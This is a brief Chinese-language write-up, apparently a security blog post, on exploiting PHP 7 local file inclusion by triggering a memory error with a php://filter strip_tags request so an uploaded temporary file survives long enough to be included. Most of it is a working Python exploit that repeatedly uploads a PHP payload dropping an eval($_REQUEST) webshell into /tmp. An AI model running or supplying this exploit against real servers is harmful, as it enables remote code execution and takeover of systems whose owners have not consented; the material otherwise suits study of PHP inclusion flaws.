php7内存错误LFI

2021-07-07

原理

原理利用payload使服务器发生内存错误，此时同时上传一个文件(经过30秒左右才会被删除)

临时文件生成在upload_tmp_dir指定路径下

包含临时文件使之生成一个新的木马文件放在tmp目录下

exp

# -*- coding: utf-8 -*-

import requests
import string
import itertools
import base64

host = "192.168.1.100"
port = 80
base_url = "http://%s:%d" % (host, port)


def upload_file_to_include(url, file_content):
    files = {'file': ('0xEaS.jpg', file_content, 'image/jpeg')}
    try:
        response = requests.post(url, files=files)

    except Exception as error:
        pass

def generate_tmp_files():
    webshell_content = base64.b64encode('<?php eval($_REQUEST["0xEaS"]);?>'.encode()).decode().strip()
    file_content = '<?php if(file_put_contents("/tmp/0xEaS", base64_decode("%s"))){echo "Getshell success!";}?>' % (webshell_content)
    phpinfo_url = "%s/?file=php://filter/string.strip_tags/resource=/etc/passwd" % (base_url) #file=index.php包含自身引发错误

    for i in range(100):
        print("[+] %d" % i)
        upload_file_to_include(phpinfo_url, file_content)

if __name__ == "__main__":
    generate_tmp_files()
